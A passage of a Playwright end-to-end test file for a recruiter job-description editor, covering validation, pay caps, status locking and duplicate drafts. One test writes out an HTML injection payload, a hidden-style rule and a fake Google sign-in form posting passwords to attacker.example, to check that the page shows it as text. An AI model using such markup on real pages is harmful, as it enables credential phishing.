import { expect, test, type APIRequestContext, type Page, type Route } from '@playwright/test';
import {
	API_URL,
	E2E_CANDIDATE_ID,
	E2E_RECRUITER_ID,
	JWT_SECRET,
	apiAs,
	blockGoogle,
	candidateSession,
	gotoHydrated,
	recruiterSession,
	signIn,
	toasts,
	type OwnerSession
} from './support/owner';
import { JOB_FIELD_CRITERIA, JOB_FIELD_PATHS, LEGAL_VERSION } from 'portfolio-common';
import { TERMS_REQUIRED, inAnHour, stubApi } from './support/api';
import { stubGoogle } from './support/google';
import { jobFormFieldOf } from '../src/services/jobPosting';
import { stubAddressSearch } from './support/addresses';
import { createJob, deleteJobs, listRecruiterJobs } from './support/jobs';

// The recruiter space, as the e2e recruiter (seeded by `bun run --cwd server seed:e2e`: a
// recruiter space on the free plan, no domain, the terms in force accepted): the job editor, the
// status of a posting (never public: no job board, no applicants), the PDF import, the account
// menu, and the terms a recruiter accepts (the sign-in of the signed-out page, with Google
// stubbed, and accepting them again, answered in the browser: the e2e recruiter's acceptance is
// never changed), and opening a recruiter space as the e2e candidate (no space, no acceptance of
// the terms: PUT /me/mode is answered in the browser, so it never gets one). GET and POST
// /jobs/import are stubbed in the browser: Claude is never called (it needs the operator's key and
// is billed); the drafts are saved for real, through POST /jobs of the e2e API. Each test names
// its postings with its own tag and removes them afterwards. The tests share the recruiter (with
// client/tests/hire-journey.test.ts and client/tests/job-view.test.ts, which run in parallel and
// add postings of their own), so they run one after the other (as the tests of a file do by
// default: keep it that way) and never expect its list to be empty.

test.skip(!JWT_SECRET, 'Set JWT_SECRET to the API’s secret to sign in as the e2e recruiter');

/** Tags of this file: what an interrupted run left behind is removed before the tests */
const TAG_PREFIX = 'rec';

let session: OwnerSession;
let api: APIRequestContext;

test.beforeAll(async () => {
	session = await recruiterSession();
	api = await apiAs(session);
	await deleteJobs(api, new RegExp(`\\b${TAG_PREFIX}-\\d+-[0-9a-z]+\\b`));
});

test.afterAll(async () => {
	await api?.dispose();
});

// Unique per test: names its postings, which it removes afterwards
let tag = '';
test.beforeEach(async ({ page }, testInfo) => {
	tag = `${TAG_PREFIX}-${testInfo.workerIndex}-${Date.now().toString(36)}`;
	await blockGoogle(page);
});

test.afterEach(async () => {
	await deleteJobs(api, tag);
});

const openAsRecruiter = async (page: Page, path: string) => {
	await signIn(page, session);
	await gotoHydrated(page, path);
};

/** A fact of a posting (its label, then its values) */
const fact = (page: Page, label: string) =>
	page.locator('dl > div').filter({ has: page.getByText(label, { exact: true }) });

const JOB_PAGE = /\/recruiter\/jobs\/([0-9a-f]{24})$/;

test.describe('the recruiter', () => {
	test('writes a job description, then opens it to candidates', async ({ page }) => {
		const title = `Backend engineer ${tag}`;
		await openAsRecruiter(page, '/recruiter');
		await page.getByRole('link', { name: 'New job description' }).click();
		await expect(
			page.getByRole('heading', { level: 2, name: 'New job description' })
		).toBeVisible();

		// The blank form lists what is missing, and goes to the first field
		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(page.getByText('Fix 5 problems before saving:')).toBeVisible();
		for (const problem of [
			'Job title: Title is required',
			'Description: Description is required',
			'City: City is required unless the job is fully remote',
			'Minimum pay: Minimum pay is required',
			'Maximum pay: Maximum pay is required'
		]) {
			await expect(page.getByRole('link', { name: problem })).toBeVisible();
		}
		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		await expect(titleInput).toBeFocused();
		await expect(titleInput).toHaveAttribute('aria-invalid', 'true');

		// A hybrid CDD in Lyon, 39 h a week
		await titleInput.fill(title);
		await page.getByRole('textbox', { name: 'Job description' }).fill('## The job\n\nBuild APIs.');
		const workMode = page.getByRole('radiogroup', { name: 'Work mode' });
		await workMode.getByText('Hybrid', { exact: true }).click();
		await expect(workMode.getByRole('radio', { name: 'Hybrid' })).toBeChecked();
		await page.getByRole('textbox', { name: 'City', exact: true }).fill('Lyon');
		await page.getByRole('textbox', { name: 'Postal code' }).fill('69003');
		await page.getByLabel('Remote days a week').selectOption('2');
		await page.getByLabel('Contract type').selectOption('cdd');
		await page.getByRole('textbox', { name: 'Duration (months)' }).fill('12');
		await page.getByRole('textbox', { name: 'Hours per week' }).fill('39');
		await page.getByRole('textbox', { name: 'Minimum pay' }).fill('42 000');
		// The top of a range is at most 1.5 times its bottom: the field says the most it can be
		const payMax = page.getByRole('textbox', { name: 'Maximum pay' });
		await payMax.fill('70 000');
		await expect(
			page.getByRole('link', {
				name: 'Maximum pay: Maximum pay must be at most €63,000 (1.5 times the minimum)'
			})
		).toBeVisible();
		await expect(payMax).toHaveAttribute('aria-invalid', 'true');
		await expect(payMax).toHaveAccessibleDescription(
			/Maximum pay must be at most €63,000 \(1\.5 times the minimum\)/
		);
		await payMax.fill('50 000');
		await expect(page.getByText('Fix 5 problems before saving:')).toBeHidden();
		await expect(payMax).not.toHaveAttribute('aria-invalid', 'true');
		await expect(page.getByText('Candidates see: €42,000 – €50,000 gross per year')).toBeVisible();
		// The job match places a candidate's ask in the range, and the editor says how
		await expect(
			page.getByText(
				"The maximum can be up to 1.5 times the minimum. A candidate's pay criterion matches when what they ask is at most 90% of the way up your range (at most your pay, when it is fixed)",
				{ exact: false }
			)
		).toBeVisible();

		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(page).toHaveURL(JOB_PAGE);
		const id = JOB_PAGE.exec(new URL(page.url()).pathname)![1];
		await expect(toasts(page).getByText('Job description created', { exact: true })).toBeVisible();
		await expect(page.getByRole('heading', { level: 2, name: title, exact: true })).toBeVisible();
		await expect(fact(page, 'Location')).toContainText('Lyon (69003), France');
		await expect(fact(page, 'Location')).toContainText('Hybrid (2 days remote a week)');
		await expect(fact(page, 'Contract')).toContainText('CDD (fixed-term) · 12 months');
		await expect(fact(page, 'Working time')).toContainText('39 h/week');
		await expect(fact(page, 'Pay')).toContainText('€42,000 – €50,000 gross per year');

		// A draft: the recruiter's alone. No job description is ever public: no page to share, no
		// applicants
		const status = page.getByRole('complementary', { name: 'Manage this job description' });
		await expect(status).toContainText('Only you can see it.');
		await expect(status).toContainText(
			"Drafts are yours alone. Pick an Open job description on a candidate's page for recruiters: only that candidate reads it."
		);
		await expect(page.getByRole('heading', { name: 'Public page' })).toHaveCount(0);
		await expect(page.getByRole('heading', { name: 'Applicants' })).toHaveCount(0);

		// Open: asked first, since its terms lock then. Cancelled, it stays a draft
		await page.getByRole('button', { name: 'Change status' }).click();
		await page.getByRole('menuitemradio', { name: /^Open/ }).click();
		const confirm = page.getByRole('alertdialog', { name: 'Open this job description?' });
		await expect(confirm).toContainText(
			"Once open, the pay and the conditions of this job are locked, because candidates' matches are computed on them. To change them later, duplicate it as a new job."
		);
		await expect(confirm.getByRole('button', { name: 'Cancel' })).toBeFocused();
		await confirm.getByRole('button', { name: 'Cancel' }).click();
		await expect(confirm).toBeHidden();
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.status).toBe('draft');
		await expect(page.getByText('Its pay and conditions have been locked')).toHaveCount(0);

		// A range saved wider than 1.5 times its bottom before that cap (none can be saved now): the
		// API refuses to open it (answered in the browser), and the page says to narrow it first
		await page.route(
			`**/jobs/${id}/status`,
			(route) =>
				route.request().method() === 'PUT'
					? route.fulfill({
							status: 422,
							json: {
								type: 'validation',
								on: 'body',
								property: 'pay.max',
								message: 'Maximum pay must be at most €63,000 (1.5 times the minimum)'
							}
						})
					: route.fallback(),
			{ times: 1 }
		);
		await page.getByRole('button', { name: 'Change status' }).click();
		await page.getByRole('menuitemradio', { name: /^Open/ }).click();
		await confirm.getByRole('button', { name: 'Open', exact: true }).click();
		await expect(
			toasts(page).getByText('Narrow its pay range before opening it', { exact: true })
		).toBeVisible();
		await expect(
			toasts(page).getByText(
				'Its maximum pay can be at most €63,000 (1.5 times its minimum). Edit the job description to narrow it, then open it.',
				{ exact: true }
			)
		).toBeVisible();
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.status).toBe('draft');

		// Open: it can be picked on a candidate's page for recruiters, and its terms are locked
		await page.getByRole('button', { name: 'Change status' }).click();
		await page.getByRole('menuitemradio', { name: /^Open/ }).click();
		await confirm.getByRole('button', { name: 'Open', exact: true }).click();
		await expect(toasts(page).getByText('Status changed to Open', { exact: true })).toBeVisible();
		await expect(
			page.getByText(
				"Its pay and conditions have been locked since it was opened: candidates' matches are computed on them. Duplicate it to change them."
			)
		).toBeVisible();
		await expect(
			toasts(page).getByText("Hiring: you can pick it on a candidate's page for recruiters.", {
				exact: true
			})
		).toBeVisible();
		await expect(page.getByRole('textbox', { name: 'Address of the public page' })).toHaveCount(0);
		const stored = (await listRecruiterJobs(api)).find((job) => job._id === id);
		expect(stored?.status).toBe('open');
	});

	test('says to narrow a draft saved wider than the cap before asking to open it', async ({
		page
	}) => {
		const { _id: id } = await createJob(api, { title: `Wide range ${tag}`, status: 'draft' });
		// Saved wider than 1.5 times its bottom before that cap (none can be saved now): the page
		// reads it so (answered in the browser)
		await page.route(`${API_URL}/recruiter/jobs/${id}`, async (route) => {
			if (route.request().method() !== 'GET') return route.fallback();
			const response = await route.fetch();
			const job = await response.json();
			await route.fulfill({ response, json: { ...job, pay: { ...job.pay, max: 80000 } } });
		});
		await openAsRecruiter(page, `/recruiter/jobs/${id}`);
		await expect(fact(page, 'Pay')).toContainText('€45,000 – €80,000 gross per year');

		// It could not be opened as it is: nothing to confirm, the toast leads to its editor
		await page.getByRole('button', { name: 'Change status' }).click();
		await page.getByRole('menuitemradio', { name: /^Open/ }).click();
		await expect(
			toasts(page).getByText('Narrow its pay range before opening it', { exact: true })
		).toBeVisible();
		await expect(
			toasts(page).getByText(
				'Its maximum pay can be at most €67,500 (1.5 times its minimum). Edit the job description to narrow it, then open it.',
				{ exact: true }
			)
		).toBeVisible();
		await expect(page.getByRole('alertdialog')).toHaveCount(0);
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.status).toBe('draft');
		await toasts(page).getByRole('button', { name: 'Edit', exact: true }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}/edit$`));
	});

	test('has an input for every field a perfect job is scored on, the office address among them', async ({
		page
	}) => {
		const title = `Platform engineer ${tag}`;
		await openAsRecruiter(page, '/recruiter/jobs/new');
		await expect(page.getByRole('textbox', { name: 'Job title' })).toBeVisible();

		// Some inputs show for some jobs only: a hybrid job counted in hours, then one counted in days
		const inputs = new Set<string>();
		const note = async () => {
			for (const id of await page.evaluate(() =>
				[...document.querySelectorAll('form [id]')].map((element) => element.id)
			)) {
				inputs.add(id.replace(/^.*?-/, ''));
			}
		};
		const workMode = page.getByRole('radiogroup', { name: 'Work mode' });
		await workMode.getByText('Hybrid', { exact: true }).click();
		await expect(page.getByLabel('Remote days a week')).toBeVisible();
		await note();
		await page
			.getByRole('radiogroup', { name: /Counted in/ })
			.getByText('Days per year (forfait jours)', { exact: true })
			.click();
		await expect(page.getByRole('textbox', { name: /^Days per year/ })).toBeVisible();
		await note();
		const scored = JOB_FIELD_PATHS.filter((path) => JOB_FIELD_CRITERIA[path].length > 0);
		expect(scored.filter((path) => !inputs.has(jobFormFieldOf(path) ?? 'no input'))).toEqual([]);

		// The address goes with the posting, and shows with its place
		await page.getByRole('textbox', { name: 'Job title' }).fill(title);
		await page.getByRole('textbox', { name: 'Job description' }).fill('Build the platform.');
		await page.getByRole('textbox', { name: 'City', exact: true }).fill('Lyon');
		await page.getByRole('textbox', { name: 'Postal code' }).fill('69003');
		await page.getByRole('combobox', { name: 'Address' }).fill('12 rue de la République');
		await page.getByRole('textbox', { name: /^Days per year/ }).fill('215');
		await page.getByRole('textbox', { name: 'Minimum pay' }).fill('60000');
		await page.getByRole('textbox', { name: 'Maximum pay' }).fill('70000');
		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(page).toHaveURL(JOB_PAGE);
		await expect(fact(page, 'Location')).toContainText(
			'12 rue de la République, Lyon (69003), France'
		);
		const id = JOB_PAGE.exec(new URL(page.url()).pathname)![1];
		const stored = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect(stored.location).toEqual({
			country: 'FR',
			city: 'Lyon',
			postalCode: '69003',
			address: '12 rue de la République',
			workMode: 'hybrid'
		});
	});

	test("finds the office's address as it is typed, and says where the map has it", async ({
		page
	}) => {
		const REPUBLIQUE = {
			label: '12 Rue de la République 69002 Lyon',
			kind: 'housenumber' as const,
			street: '12 Rue de la République',
			postalCode: '69002',
			city: 'Lyon'
		};
		const PLACE = {
			label: 'Place de la République 69002 Lyon',
			kind: 'street' as const,
			street: 'Place de la République',
			postalCode: '69002',
			city: 'Lyon'
		};
		const asked = await stubAddressSearch(page, {
			search: (sent) => (/rep/i.test(sent.q ?? '') ? [REPUBLIQUE, PLACE] : []),
			office: (sent) =>
				/inconnue/i.test(sent.address ?? '')
					? { found: 'town', label: 'Lyon' }
					: sent.address
						? { found: 'street', label: REPUBLIQUE.label }
						: { found: 'town', label: 'Lyon' }
		});
		await openAsRecruiter(page, '/recruiter/jobs/new');
		const city = page.getByRole('textbox', { name: 'City', exact: true });
		const postalCode = page.getByRole('textbox', { name: 'Postal code' });
		const address = page.getByRole('combobox', { name: 'Address' });
		const found = page.locator('[data-office-place]');
		const options = page.getByRole('listbox', { name: 'Suggestions' }).getByRole('option');

		// A town alone: said, without a warning
		await city.fill('Lyon');
		await page.getByRole('textbox', { name: 'Job title' }).focus();
		await expect(found).toHaveText(
			'Without a street, travel times are counted to the centre of Lyon.'
		);

		// What is typed is searched in the town already given; too little is not, even after the pause
		await address.pressSequentially('12');
		await page.waitForTimeout(500);
		expect(asked.search).toEqual([]);
		await expect(address).toHaveAttribute('aria-expanded', 'false');
		await address.pressSequentially(' rue de la rep');
		await expect(options).toHaveText([
			'12 Rue de la République 69002 Lyon',
			'Place de la République 69002 Lyon'
		]);
		await expect(address).toHaveAttribute('aria-expanded', 'true');
		expect(asked.search.at(-1)).toEqual({ q: '12 rue de la rep', city: 'Lyon' });

		// Escape closes the list, and only the list: nothing is lost
		await address.press('Escape');
		await expect(options).toHaveCount(0);
		await expect(address).toHaveValue('12 rue de la rep');
		await expect(
			page.getByRole('heading', { level: 2, name: 'New job description' })
		).toBeVisible();

		// The arrows and Enter pick an address: its street, postal code and town fill their fields
		await address.press('ArrowDown');
		await expect(options.first()).toHaveAttribute('aria-selected', 'true');
		await address.press('Enter');
		await expect(address).toHaveValue('12 Rue de la République');
		await expect(postalCode).toHaveValue('69002');
		await expect(city).toHaveValue('Lyon');
		await expect(options).toHaveCount(0);
		await expect(found).toHaveText(
			'Found on the map: 12 Rue de la République 69002 Lyon. Travel times are counted to this address.'
		);
		// Picked from the map: it is not asked again (the only lookup so far is the town's, above)
		expect(asked.office).toHaveLength(1);

		// A street the map does not know is said once its fields are left
		await address.fill('99 rue Inconnue');
		await expect(page.locator('[data-address-notice]')).toContainText(
			'No address found for what you typed.'
		);
		// A notice is no list: the field does not say it is expanded
		await expect(address).toHaveAttribute('aria-expanded', 'false');
		await expect(found).toHaveText('');
		await page.getByRole('textbox', { name: 'Job title' }).focus();
		await expect(found).toHaveText(
			'This street was not found on the map: travel times are counted to the centre of Lyon. Pick the address in the list, or check its spelling.'
		);
		expect(asked.office).toHaveLength(2);
		expect(asked.office.at(-1)).toEqual({
			address: '99 rue Inconnue',
			postalCode: '69002',
			city: 'Lyon'
		});

		// A fully remote job has no office to travel to
		await page
			.getByRole('radiogroup', { name: 'Work mode' })
			.getByText('Full remote', { exact: true })
			.click();
		await expect(found).toHaveCount(0);
	});

	test('edits a job description, then deletes it', async ({ page }) => {
		const title = `Backend engineer ${tag}`;
		// A draft: every field can change (an opened one's terms are locked, tested below)
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		await openAsRecruiter(page, `/recruiter/jobs/${id}`);

		await page.getByRole('link', { name: 'Edit', exact: true }).click();
		await expect(
			page.getByRole('heading', { level: 2, name: 'Edit job description' })
		).toBeVisible();
		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		await expect(titleInput).toHaveValue(title);
		await expect(page.getByRole('textbox', { name: 'City', exact: true })).toHaveValue('Paris');
		const newTitle = `Senior backend engineer ${tag}`;
		await titleInput.fill(newTitle);
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));
		await expect(toasts(page).getByText('Changes saved', { exact: true })).toBeVisible();
		await expect(
			page.getByRole('heading', { level: 2, name: newTitle, exact: true })
		).toBeVisible();

		// Delete, from the dashboard, once confirmed
		await gotoHydrated(page, '/recruiter');
		const list = page.getByRole('list', { name: 'Job descriptions' });
		const card = list.getByRole('listitem').filter({ hasText: newTitle });
		await expect(card).toContainText('Draft');
		// Its name ends with the title (for screen readers): the only Delete of the card
		await card.getByRole('button', { name: /^Delete\b/ }).click();
		const dialog = page.getByRole('alertdialog', { name: `Delete “${newTitle}”?` });
		await expect(dialog).toContainText('This cannot be undone.');
		await dialog.getByRole('button', { name: 'Delete', exact: true }).click();
		await expect(dialog).toBeHidden();
		await expect(toasts(page).getByText('Job description deleted', { exact: true })).toBeVisible();
		await expect(card).toHaveCount(0);
		expect((await listRecruiterJobs(api)).map((job) => job._id)).not.toContain(id);

		await gotoHydrated(page, `/recruiter/jobs/${id}`);
		await expect(page.getByRole('heading', { name: 'Job description not found' })).toBeVisible();
	});

	// JobDetails renders the Markdown without raw HTML (html={false}), here and on the job's
	// private page (job-view.test.ts)
	test('a description shows its raw HTML as text: it cannot restyle the page or add a form', async ({
		page
	}) => {
		const description = [
			'## The job',
			'',
			'Sign in again below.',
			'<style>aside[aria-label="Manage this job description"]{display:none!important}</style>',
			'<form action="https://attacker.example/collect" method="post"><label>Google password <input name="password" type="password"></label><button>Sign in with Google</button></form>',
			'',
			'Inline <span style="position:fixed;inset:0;background:red">cover</span> text.'
		].join('\n');
		const { _id: id } = await createJob(api, {
			title: `Sales lead ${tag}`,
			status: 'open',
			description
		});

		await openAsRecruiter(page, `/recruiter/jobs/${id}`);

		await expect(
			page.getByRole('complementary', { name: 'Manage this job description' })
		).toBeVisible();
		await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
		await expect(page.locator('input[type="password"]')).toHaveCount(0);
		await expect(page.getByRole('button', { name: 'Sign in with Google' })).toHaveCount(0);
		await expect(
			page.getByText('<form action="https://attacker.example/collect"', { exact: false })
		).toBeVisible();
		// Its headings rank right under "About the job" (h3): an h4, not an h5
		await expect(page.getByRole('heading', { level: 4, name: 'The job' })).toBeVisible();
	});

	test('freezes the fields while saving, and never saves over changes made elsewhere', async ({
		page
	}) => {
		const title = `Platform engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);
		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		await expect(titleInput).toHaveValue(title);

		// Opened from another tab meanwhile: the editor still shows the draft
		const opened = await api.put(`${API_URL}/jobs/${id}/status`, { data: { status: 'open' } });
		expect(opened.ok()).toBe(true);
		const description = page.getByRole('textbox', { name: 'Job description' });
		const fixed = '## The job\n\nCreated by an end-to-end test (typo fixed).';
		const typedTitle = `Platform engineer, typo fixed ${tag}`;
		await titleInput.fill(typedTitle);
		await description.fill(fixed);
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(
			page.getByText(/^This job description was saved elsewhere since you started editing it/)
		).toBeVisible();
		// Nothing was overwritten: still open, with its title and description
		const stored = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect([stored.status, stored.title, stored.description]).toEqual([
			'open',
			title,
			'## The job\n\nCreated by an end-to-end test.'
		]);

		// Reloaded: the saved posting, with the changes over it, flagged as older. It was opened
		// meanwhile: its terms are read-only now, and the title typed cannot be saved on it: it is
		// kept, named, for a duplicate
		await page.getByRole('button', { name: 'Reload', exact: true }).click();
		await expect(
			page.getByText(
				'This job description was saved since you made them: check them before saving.'
			)
		).toBeVisible();
		await expect(description).toHaveValue(fixed);
		await expect(titleInput).toHaveValue(title);
		await expect(titleInput).not.toBeEditable();
		const held = page.getByRole('region', {
			name: 'Your changes to its pay and conditions cannot be saved'
		});
		await expect(held).toContainText(
			'This job description was opened after you made them in this browser'
		);
		await expect(held).toContainText('Fields changed: Job title.');
		await page.getByLabel('Status').selectOption('open');

		// Saving: the fields take nothing until the answer (it would not be sent)
		await page.route(`${API_URL}/jobs/${id}`, async (route) => {
			if (route.request().method() === 'PUT') await new Promise((done) => setTimeout(done, 1500));
			await route.continue();
		});
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(page.getByRole('textbox', { name: 'Company' })).toBeDisabled();
		await expect(titleInput).toBeDisabled();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));
		const saved = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect([saved.status, saved.title, saved.description]).toEqual(['open', title, fixed]);

		// Back in the editor: the rest was saved, the title typed is still kept for a duplicate
		await gotoHydrated(page, `/recruiter/jobs/${id}/edit`);
		await expect(held).toContainText('Fields changed: Job title.');
		await expect(page.getByText('No changes yet')).toBeVisible();
		// A copy of it kept in this browser already, with changes of its own: replaced once confirmed
		const copyKey = `jobDraft:${E2E_RECRUITER_ID}:copy:${id}`;
		await page.evaluate(
			(key) => localStorage.setItem(key, JSON.stringify({ form: { title: 'An older copy' } })),
			copyKey
		);
		await held.getByRole('button', { name: 'Duplicate with my changes' }).click();
		const replace = page.getByRole('alertdialog', { name: 'Replace your unsaved copy?' });
		await expect(replace).toContainText(
			'This browser already keeps an unsaved copy of this job description, with changes of its own.'
		);
		await replace.getByRole('button', { name: 'Cancel' }).click();
		await expect(replace).toBeHidden();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}/edit$`));
		await held.getByRole('button', { name: 'Duplicate with my changes' }).click();
		await replace.getByRole('button', { name: 'Replace it' }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/new\\?duplicate=${id}$`));
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(titleInput).toHaveValue(typedTitle);
		await expect(titleInput).toBeEditable();
		await expect(description).toHaveValue(fixed);
		await expect(page.getByLabel('Status')).toHaveValue('draft');
		// Moved: the posting's own draft is gone
		expect(
			await page.evaluate((key) => localStorage.getItem(key), `jobDraft:${E2E_RECRUITER_ID}:${id}`)
		).toBeNull();
	});

	test('asks before a save opens a job description, then locks its terms: Duplicate starts a new draft from it', async ({
		page
	}) => {
		const title = `Data engineer ${tag}`;
		const { _id: id } = await createJob(api, {
			title,
			status: 'draft',
			requirements: { skills: ['Python'] }
		});
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);
		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		await expect(titleInput).toBeEditable();
		await expect(page.locator('[data-terms-locked]')).toHaveCount(0);

		// Saved as open: asked first. Cancelled, nothing is saved
		await page.getByLabel('Status').selectOption('open');
		await page.getByRole('button', { name: 'Save changes' }).click();
		const confirm = page.getByRole('alertdialog', { name: 'Open this job description?' });
		await expect(confirm).toContainText(
			'Once open, the pay and the conditions of this job are locked'
		);
		// ...and which fields that is, the title included: a typo is fixed before
		await expect(confirm).toHaveAccessibleDescription(
			/locked fields: job title, city, postal code, .* seniority, skills and travel\.$/i
		);
		await confirm.getByRole('button', { name: 'Cancel' }).click();
		await expect(confirm).toBeHidden();
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.status).toBe('draft');
		await page.getByRole('button', { name: 'Save changes' }).click();
		await confirm.getByRole('button', { name: 'Open', exact: true }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.status).toBe('open');

		// Its page: Duplicate next to Edit
		await expect(page.getByRole('link', { name: 'Duplicate', exact: true })).toHaveAttribute(
			'href',
			`/recruiter/jobs/new?duplicate=${id}`
		);

		// Edited again (its toast would cover Edit): its terms are read-only, said at the top; the
		// rest is not
		await gotoHydrated(page, `/recruiter/jobs/${id}/edit`);
		const note = page.getByRole('region', { name: 'Pay and conditions locked' });
		await expect(note).toContainText(
			"This job description was opened: its pay and its conditions (the fields with a lock) can no longer be changed, because candidates' matches are computed on them. You can still edit its description and the other fields, and change its status. To change its pay and conditions, duplicate it as a new job description."
		);
		await expect(note).toContainText(
			'Locked fields: Job title, City, Postal code, Address, Work mode, Remote days a week, Contract type, Working time, Hours per week, Days per year, RTT days per year, Minimum pay, Maximum pay, Pay period, Direct reports, Seniority, Skills and Travel.'
		);
		await expect(titleInput).toHaveValue(title);
		for (const locked of [
			titleInput,
			page.getByRole('textbox', { name: 'City', exact: true }),
			page.getByRole('textbox', { name: 'Minimum pay' }),
			page.getByRole('textbox', { name: 'Maximum pay' }),
			page.getByLabel('Contract type'),
			page.getByLabel('Pay period'),
			page.getByRole('textbox', { name: 'Skills' })
		]) {
			await expect(locked).not.toBeEditable();
		}
		await expect(titleInput).toHaveAccessibleDescription(
			'Locked since the job description was opened.'
		);
		// A locked choice is a read-only field holding its label, in the tab order like the others
		const contract = page.getByRole('textbox', { name: 'Contract type' });
		await expect(contract).toHaveValue('CDI (permanent)');
		await expect(contract).toHaveAccessibleDescription(
			'Locked since the job description was opened.'
		);
		await contract.focus();
		await expect(contract).toBeFocused();
		await expect(page.getByRole('combobox', { name: 'Pay period' })).toHaveCount(0);
		await expect(page.getByRole('textbox', { name: 'Pay period' })).toHaveValue('per year');
		await expect(page.getByRole('button', { name: /^Remove Python/ })).toHaveCount(0);
		// A read-only input still gets a paste: the skills take nothing from it
		const skills = page.getByRole('list', { name: /^Skills added/ });
		await expect(skills.getByRole('listitem')).toHaveCount(1);
		await page.getByRole('textbox', { name: 'Skills' }).evaluate((input) => {
			const clipboardData = new DataTransfer();
			clipboardData.setData('text', 'Go\nRust');
			input.dispatchEvent(
				new ClipboardEvent('paste', { clipboardData, bubbles: true, cancelable: true })
			);
		});
		await expect(skills.getByRole('listitem')).toHaveCount(1);
		await expect(page.getByText('No changes yet')).toBeVisible();
		// The work mode's choices are read-only: forced, a click changes nothing
		const workMode = page.getByRole('radiogroup', { name: 'Work mode' });
		await workMode.getByText('Hybrid', { exact: true }).click({ force: true });
		await expect(workMode.getByRole('radio', { name: 'On site' })).toBeChecked();
		await expect(workMode).toHaveAccessibleDescription(
			'Locked since the job description was opened.'
		);
		for (const open of [
			page.getByRole('textbox', { name: 'Job description' }),
			page.getByRole('textbox', { name: 'Company' }),
			page.getByRole('textbox', { name: 'Benefits' }),
			page.getByLabel('Status')
		]) {
			await expect(open).toBeEditable();
		}
		await page.getByRole('textbox', { name: 'Company' }).fill('E2E Holding');
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(toasts(page).getByText('Changes saved', { exact: true })).toBeVisible();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));

		// Duplicate, from the editor's note: a new draft with its fields, nothing saved yet
		await gotoHydrated(page, `/recruiter/jobs/${id}/edit`);
		await note.getByRole('link', { name: 'Duplicate' }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/new\\?duplicate=${id}$`));
		await expect(
			page.getByRole('heading', { level: 2, name: 'New job description' })
		).toBeVisible();
		await expect(
			page.getByText(`A copy of “${title}”, as a new draft: change what you need, then create it.`)
		).toBeVisible();
		await expect(page.locator('[data-terms-locked]')).toHaveCount(0);
		await expect(titleInput).toHaveValue(title);
		await expect(page.getByRole('textbox', { name: 'Company' })).toHaveValue('E2E Holding');
		await expect(page.getByLabel('Status')).toHaveValue('draft');
		const minimum = page.getByRole('textbox', { name: 'Minimum pay' });
		await expect(minimum).toHaveValue('45000');
		await expect(minimum).toBeEditable();
		await titleInput.fill(`Senior data engineer ${tag}`);
		await minimum.fill('50000');
		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(page).toHaveURL(JOB_PAGE);
		const copyId = JOB_PAGE.exec(new URL(page.url()).pathname)![1];
		expect(copyId).not.toBe(id);

		const jobs = await listRecruiterJobs(api);
		const copy = await (await api.get(`${API_URL}/recruiter/jobs/${copyId}`)).json();
		expect(copy).toMatchObject({
			title: `Senior data engineer ${tag}`,
			status: 'draft',
			company: 'E2E Holding',
			pay: { min: 50000, max: 55000 },
			requirements: { skills: ['Python'] }
		});
		expect(copy).not.toHaveProperty('publishedAt');
		// The original stays as it was
		expect(jobs.find((job) => job._id === id)).toMatchObject({ title, status: 'open' });
	});

	test('asks before a draft leaves the drafts with another status than Open, which locks its terms too', async ({
		page
	}) => {
		const title = `Paused engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		await openAsRecruiter(page, `/recruiter/jobs/${id}`);

		await page.getByRole('button', { name: 'Change status' }).click();
		await page.getByRole('menuitemradio', { name: /^On hold/ }).click();
		const confirm = page.getByRole('alertdialog', {
			name: 'Set this job description to On hold?'
		});
		await expect(confirm).toContainText(
			"Once it leaves the drafts, the pay and the conditions of this job are locked, because candidates' matches are computed on them. To change them later, duplicate it as a new job."
		);
		await confirm.getByRole('button', { name: 'Set to On hold' }).click();
		await expect(
			toasts(page).getByText('Status changed to On hold', { exact: true })
		).toBeVisible();
		await expect(
			page.getByText(
				"Its pay and conditions have been locked since it was opened: candidates' matches are computed on them. Duplicate it to change them."
			)
		).toBeVisible();
		const stored = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect([stored.status, typeof stored.publishedAt]).toEqual(['on_hold', 'string']);

		// Its editor shows its terms read-only
		await gotoHydrated(page, `/recruiter/jobs/${id}/edit`);
		await expect(page.getByRole('region', { name: 'Pay and conditions locked' })).toBeVisible();
		await expect(page.getByRole('textbox', { name: 'Job title' })).not.toBeEditable();
	});

	test('a copy of a posting it cannot read says so, retries a failure, and keeps a copy started of a deleted one', async ({
		page
	}) => {
